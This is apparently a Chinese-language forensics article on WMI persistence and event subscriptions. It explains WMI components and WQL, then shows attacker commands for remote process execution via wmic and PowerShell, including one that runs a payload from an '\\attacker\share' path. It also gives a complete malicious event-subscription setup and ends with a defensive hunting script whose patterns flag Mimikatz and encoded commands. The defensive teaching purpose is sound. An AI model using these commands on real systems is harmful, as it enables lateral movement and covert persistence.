WMIжҢҒд№…еҢ–дёҺдәӢд»¶и®ўйҳ…еҸ–иҜҒеҲҶжһҗ

Windows Management InstrumentationпјҲWMIпјүжҳҜ Windows зі»з»ҹдёӯжңҖејәеӨ§зҡ„з®ЎзҗҶиҮӘеҠЁеҢ–жЎҶжһ¶д№ӢдёҖпјҢд№ҹжҳҜж”»еҮ»иҖ…е®һзҺ°жҢҒд№…еҢ–гҖҒиҝңзЁӢжү§иЎҢе’ҢжЁӘеҗ‘з§»еҠЁзҡ„ж ёеҝғе·Ҙе…·гҖӮWMI еҶ…зҪ®дәҺжүҖжңүзҺ°д»Ј Windows зі»з»ҹпјҢжҸҗдҫӣдәҶдё°еҜҢзҡ„зі»з»ҹз®ЎзҗҶиғҪеҠӣпјҢеҢ…жӢ¬иҝӣзЁӢеҲӣе»әгҖҒжңҚеҠЎз®ЎзҗҶгҖҒжіЁеҶҢиЎЁж“ҚдҪңгҖҒдәӢд»¶зӣ‘жҺ§зӯүеҠҹиғҪгҖӮ

MITRE ATT&CK жЎҶжһ¶дёӯпјҢWMI зӣёе…іжҠҖжңҜиҰҶзӣ–дәҶеӨҡдёӘжҲҳжңҜйўҶеҹҹпјҡT1047пјҲWindows Management Instrumentationпјүз”ЁдәҺжү§иЎҢпјҢT1546.003пјҲWindows Management Instrumentation Event Subscriptionпјүз”ЁдәҺжҢҒд№…еҢ–е’ҢжқғйҷҗжҸҗеҚҮгҖӮRed Canary зҡ„еЁҒиғҒжЈҖжөӢжҠҘе‘ҠжҳҫзӨәпјҢWMI ж»Ҙз”ЁеңЁдјҒдёҡзҺҜеўғдёӯжҢҒз»ӯеўһй•ҝпјҢзү№еҲ«жҳҜеңЁй«ҳзә§жҢҒз»ӯжҖ§еЁҒиғҒпјҲAPTпјүж”»еҮ»дёӯгҖӮ

е·Іжңүж–Үз«  PowerShellж”»еҮ»й“ҫдёҺж—Ҙеҝ—еҸ–иҜҒеҲҶжһҗ иҰҶзӣ–дәҶ PowerShell ж”»еҮ»й“ҫзҡ„еҸ–иҜҒж–№жі•гҖӮжң¬ж–ҮжҚўдёҖдёӘи§’еәҰпјҡдёҚи®Ёи®әйҖҡз”Ёзҡ„ PowerShell еҸ–иҜҒпјҢиҖҢжҳҜиҒҡз„ҰдәҺ WMI зҡ„е®Ңж•ҙж”»еҮ»й“ҫпјҢж·ұе…ҘеҲҶжһҗ WMI жһ¶жһ„еҹәзЎҖгҖҒдәӢд»¶и®ўйҳ…жңәеҲ¶гҖҒж°ёд№…дәӢд»¶и®ўйҳ…ж”»еҮ»гҖҒMOF ж–Үд»¶ж”»еҮ»гҖҒWMI ж”»еҮ»й“ҫеҸ–иҜҒгҖҒдәӢд»¶ж—Ҙеҝ—еҲҶжһҗгҖҒжЈҖжөӢе·Ҙе…·й“ҫгҖҒиҜҒжҚ®ејәеәҰеҲҶеұӮгҖҒе…¬ејҖжЎҲдҫӢе’ҢиҮӘеҠЁеҢ–зӢ©зҢҺи„ҡжң¬гҖӮ

WMI ж ёеҝғз»„д»¶

WMIпјҲWindows Management InstrumentationпјүжҳҜеҹәдәҺ Web-Based Enterprise ManagementпјҲWBEMпјүж ҮеҮҶзҡ„ Windows з®ЎзҗҶжЎҶжһ¶гҖӮе…¶ж ёеҝғз»„д»¶еҢ…жӢ¬пјҡ

CIMOMпјҲCommon Information Model Object Managerпјү

CIMOM жҳҜ WMI зҡ„ж ёеҝғеј•ж“ҺпјҢиҙҹиҙЈз®ЎзҗҶ WMI е‘ҪеҗҚз©әй—ҙгҖҒзұ»гҖҒе®һдҫӢе’ҢжҹҘиҜўгҖӮCIMOM жңҚеҠЎпјҲwinmgmt.exeпјүеңЁзі»з»ҹеҗҜеҠЁж—¶иҮӘеҠЁиҝҗиЎҢпјҢдҪңдёә SVCHOST иҝӣзЁӢзҡ„дёҖйғЁеҲҶгҖӮ

Get-Service winmgmt | Select-Object Name, Status, StartType

WMI RepositoryпјҲWMI д»“еә“пјү

WMI Repository жҳҜдёҖдёӘйқўеҗ‘еҜ№иұЎж•°жҚ®еә“пјҢеӯҳеӮЁдәҶжүҖжңү WMI зұ»гҖҒе®һдҫӢе’Ңе‘ҪеҗҚз©әй—ҙзҡ„е®ҡд№үгҖӮд»“еә“дҪҚдәҺ %SystemRoot%\System32\wbem\Repository зӣ®еҪ•дёӢгҖӮ

Get-WmiObject -Namespace "root" -Class "__Namespace" | Select-Object Name

WMI ProvidersпјҲWMI жҸҗдҫӣзЁӢеәҸпјү

WMI Providers жҳҜиҝһжҺҘ WMI е’Ңзі»з»ҹз®ЎзҗҶеҜ№иұЎзҡ„жЎҘжўҒгҖӮProvider иҙҹиҙЈд»Һеә•еұӮзі»з»ҹж”¶йӣҶж•°жҚ®е№¶дј йҖ’з»ҷ WMIпјҢжҲ–е°Ҷ WMI ж“ҚдҪңиҪ¬жҚўдёәеҜ№еә•еұӮзі»з»ҹзҡ„ж“ҚдҪңгҖӮ

еёёи§Ғзҡ„ WMI Providerпјҡ

  • Win32 ProviderпјҡжҸҗдҫӣ Windows зі»з»ҹдҝЎжҒҜпјҲиҝӣзЁӢгҖҒжңҚеҠЎгҖҒз”ЁжҲ·зӯүпјү
  • Registry ProviderпјҡжҸҗдҫӣжіЁеҶҢиЎЁи®ҝй—®иғҪеҠӣ
  • Event Log ProviderпјҡжҸҗдҫӣдәӢд»¶ж—Ҙеҝ—и®ҝй—®иғҪеҠӣ
  • WDM ProviderпјҡжҸҗдҫӣ Windows й©ұеҠЁжЁЎеһӢи®ҝй—®иғҪеҠӣ
Get-WmiObject -Namespace "root\cimv2" -Class "__Win32Provider" | Select-Object Name, CLSID

WMI жҹҘиҜўиҜӯиЁҖпјҲWQLпјү

WQLпјҲWMI Query LanguageпјүжҳҜ WMI зҡ„жҹҘиҜўиҜӯиЁҖпјҢзұ»дјјдәҺ SQLгҖӮWQL з”ЁдәҺжҹҘиҜў WMI зұ»е’Ңе®һдҫӢпјҢж”ҜжҢҒ SELECTгҖҒWHEREгҖҒFROM зӯүе…ій”®еӯ—гҖӮ

еҹәзЎҖжҹҘиҜў

Get-WmiObject -Query "SELECT * FROM Win32_Process WHERE Name='powershell.exe'"

дәӢд»¶жҹҘиҜў

$query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_Process'"
Register-WmiEvent -Query $query -SourceName "ProcessCreation"

е…іиҒ”жҹҘиҜў

Get-WmiObject -Query "ASSOCIATORS OF {Win32_Process.Handle=$PID} WHERE AssocClass=Win32_ProcessParentCycle"

WMI иҝңзЁӢжү§иЎҢжңәеҲ¶

WMI ж”ҜжҢҒиҝңзЁӢз®ЎзҗҶпјҢж”»еҮ»иҖ…еҸҜд»ҘеҲ©з”Ё WMI еңЁиҝңзЁӢзі»з»ҹдёҠжү§иЎҢе‘Ҫд»ӨгҖӮ

дҪҝз”Ё WMIC иҝңзЁӢжү§иЎҢ

wmic /node:192.168.1.100 /user:administrator /password:Password123 process call create "cmd.exe /c powershell -ep bypass -file \\attacker\share\payload.ps1"

дҪҝз”Ё PowerShell иҝңзЁӢжү§иЎҢ

$options = New-CimSessionOption -Protocol Dcom
$session = New-CimSession -ComputerName "192.168.1.100" -Credential $cred -SessionOption $options
Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\temp\payload.ps1"}

дҪҝз”Ё Invoke-WmiMethod иҝңзЁӢжү§иЎҢ

$cred = Get-Credential
Invoke-WmiMethod -ComputerName "192.168.1.100" -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c powershell -ep bypass -file C:\temp\payload.ps1" -Credential $cred

0x02 WMI дәӢд»¶и®ўйҳ…жңәеҲ¶

дәӢд»¶и®ўйҳ…зҡ„дёүдёӘж ёеҝғз»„д»¶

WMI дәӢд»¶и®ўйҳ…з”ұдёүдёӘж ёеҝғз»„д»¶з»„жҲҗпјҡEventFilterпјҲдәӢд»¶иҝҮж»ӨеҷЁпјүгҖҒEventConsumerпјҲдәӢд»¶ж¶Ҳиҙ№иҖ…пјүе’Ң FilterToConsumerBindingпјҲиҝҮж»ӨеҷЁеҲ°ж¶Ҳиҙ№иҖ…зҡ„з»‘е®ҡпјүгҖӮ

EventFilterпјҲдәӢд»¶иҝҮж»ӨеҷЁпјү

EventFilter е®ҡд№үдәҶи§ҰеҸ‘дәӢд»¶зҡ„жқЎд»¶гҖӮе®ғдҪҝз”Ё WQL жҹҘиҜўиҜӯиЁҖжҢҮе®ҡиҰҒзӣ‘жҺ§зҡ„дәӢд»¶зұ»еһӢе’ҢжқЎд»¶гҖӮ

$filter = @{
    Name = "MaliciousFilter"
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
}
Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $filter

EventConsumerпјҲдәӢд»¶ж¶Ҳиҙ№иҖ…пјү

EventConsumer е®ҡд№үдәҶдәӢд»¶и§ҰеҸ‘ж—¶иҰҒжү§иЎҢзҡ„ж“ҚдҪңгҖӮWMI жҸҗдҫӣдәҶеӨҡз§ҚдәӢд»¶ж¶Ҳиҙ№иҖ…зұ»еһӢпјҢеҢ…жӢ¬е‘Ҫд»ӨиЎҢжү§иЎҢгҖҒи„ҡжң¬жү§иЎҢгҖҒж—Ҙеҝ—еҶҷе…ҘзӯүгҖӮ

$consumer = @{
    Name = "MaliciousConsumer"
    CommandLineTemplate = "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\temp\payload.ps1"
}
Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $consumer

FilterToConsumerBindingпјҲиҝҮж»ӨеҷЁеҲ°ж¶Ҳиҙ№иҖ…зҡ„з»‘е®ҡпјү

FilterToConsumerBinding е°Ҷ EventFilter е’Ң EventConsumer е…іиҒ”иө·жқҘпјҢеҪўжҲҗе®Ңж•ҙзҡ„дәӢд»¶и®ўйҳ…гҖӮ

$binding = @{
    Filter = "__EventFilter.Name='MaliciousFilter'"
    Consumer = "CommandLineEventConsumer.Name='MaliciousConsumer'"
}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $binding

function Test-WMIPersistence {
    [CmdletBinding()]
    param()
    
    Write-Host "=== WMI жҢҒд№…еҢ–жЈҖжөӢ ===" -ForegroundColor Cyan
    Write-Host "жЈҖжөӢж—¶й—ҙ: $(Get-Date)" -ForegroundColor Gray
    Write-Host ""
    
    $results = @()
    
    Write-Host "[1] жЈҖжҹҘдәӢд»¶иҝҮж»ӨеҷЁ..." -ForegroundColor Yellow
    $filters = Get-WmiObject -Namespace root\subscription -Class __EventFilter -ErrorAction SilentlyContinue
    foreach ($filter in $filters) {
        $suspicious = $false
        $reason = ""
        
        if ($filter.Query -like "*SystemUpTime*") {
            $suspicious = $true
            $reason = "дҪҝз”Ёзі»з»ҹеҗҜеҠЁж—¶й—ҙи§ҰеҸ‘"
        }
        if ($filter.Query -like "*powershell*" -or $filter.Query -like "*cmd.exe*") {
            $suspicious = $true
            $reason = "жҹҘиҜўеҢ…еҗ«еҸҜз–‘е‘Ҫд»Ө"
        }
        
        $results += [PSCustomObject]@{
            Type = "EventFilter"
            Name = $filter.Name
            Query = $filter.Query
            Suspicious = $suspicious
            Reason = $reason
        }
        
        if ($suspicious) {
            Write-Host "[!] еҸҜз–‘дәӢд»¶иҝҮж»ӨеҷЁ: $($filter.Name) - $reason" -ForegroundColor Red
        }
    }
    
    Write-Host "`n[2] жЈҖжҹҘдәӢд»¶ж¶Ҳиҙ№иҖ…..." -ForegroundColor Yellow
    $consumers = Get-WmiObject -Namespace root\subscription -Class __EventConsumer -ErrorAction SilentlyContinue
    foreach ($consumer in $consumers) {
        $suspicious = $false
        $reason = ""
        
        if ($consumer.CommandLineTemplate -like "*powershell*" -and $consumer.CommandLineTemplate -like "*EncodedCommand*") {
            $suspicious = $true
            $reason = "жү§иЎҢзј–з Ғзҡ„ PowerShell е‘Ҫд»Ө"
        }
        if ($consumer.CommandLineTemplate -like "*Invoke-Mimikatz*" -or $consumer.CommandLineTemplate -like "*Invoke-Shellcode*") {
            $suspicious = $true
            $reason = "жү§иЎҢе·ІзҹҘжҒ¶ж„Ҹе·Ҙе…·"
        }
        
        $results += [PSCustomObject]@{
            Type = "EventConsumer"
            Name = $consumer.Name
            CommandLine = $consumer.CommandLineTemplate
            Suspicious = $suspicious
            Reason = $reason
        }
        
        if ($suspicious) {
            Write-Host "[!] еҸҜз–‘дәӢд»¶ж¶Ҳиҙ№иҖ…: $($consumer.Name) - $reason" -ForegroundColor Red
        }
    }
    
    Write-Host "`n[3] жЈҖжҹҘиҝҮж»ӨеҷЁеҲ°ж¶Ҳиҙ№иҖ…зҡ„з»‘е®ҡ..." -ForegroundColor Yellow
    $bindings = Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue
    foreach ($binding in $bindings) {
        $results += [PSCustomObject]@{
            Type = "Binding"
            Filter = $binding.Filter
            Consumer = $binding.Consumer
            Suspicious = $true
            Reason = "еҸ‘зҺ°дәӢд»¶и®ўйҳ…з»‘е®ҡ"
        }
        Write-Host "[!] еҸ‘зҺ°з»‘е®ҡ: $($binding.Filter) -> $($binding.Consumer)" -ForegroundColor Red
    }
    
    Write-Host "`n[4] жЈҖжҹҘ MOF ж–Үд»¶..." -ForegroundColor Yellow
    $mofFiles = Get-ChildItem -Path "C:\Windows\System32\wbem\Autorecover\" -Filter "*.mof" -Recurse -ErrorAction SilentlyContinue
    foreach ($mof in $mofFiles) {
        $results += [PSCustomObject]@{
            Type = "MOFFile"
            Name = $mof.Name
            Path = $mof.FullName
            LastWriteTime = $mof.LastWriteTime
            Suspicious = $true
            Reason = "еҸ‘зҺ° MOF ж–Үд»¶"
        }
        Write-Host "[!] еҸ‘зҺ° MOF ж–Үд»¶: $($mof.FullName)" -ForegroundColor Red
    }
    
    Write-Host "`n[5] жЈҖжҹҘ WMI жҙ»еҠЁж—Ҙеҝ—..." -ForegroundColor Yellow
    $wmiLogs = Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-WMI-Activity/Operational'; ID=5861} -MaxEvents 50 -ErrorAction SilentlyContinue
    foreach ($log in $wmiLogs) {
        $results += [PSCustomObject]@{
            Type = "WMILog"
            TimeCreated = $log.TimeCreated
            Message = $log.Message
            Suspicious = $true
            Reason = "еҸ‘зҺ°ж°ёд№…дәӢд»¶и®ўйҳ…ж—Ҙеҝ—"
        }
        Write-Host "[!] еҸ‘зҺ°ж°ёд№…дәӢд»¶и®ўйҳ…: $($log.TimeCreated)" -ForegroundColor Red
    }
    
    Write-Host "`n=== жЈҖжөӢз»“жһңжұҮжҖ» ===" -ForegroundColor Cyan
    $suspiciousCount = ($results | Where-Object {$_.Suspicious -eq $true}).Count
    if ($suspiciousCount -gt 0) {
        Write-Host "[!] еҸ‘зҺ° $suspiciousCount дёӘеҸҜз–‘йЎ№" -ForegroundColor Red
        $results | Where-Object {$_.Suspicious -eq $true} | Format-Table Type, Name, Reason -AutoSize
    } else {
        Write-Host "[+] жңӘеҸ‘зҺ°еҸҜз–‘ WMI жҢҒд№…еҢ–" -ForegroundColor Green
    }
    
    return $results
}
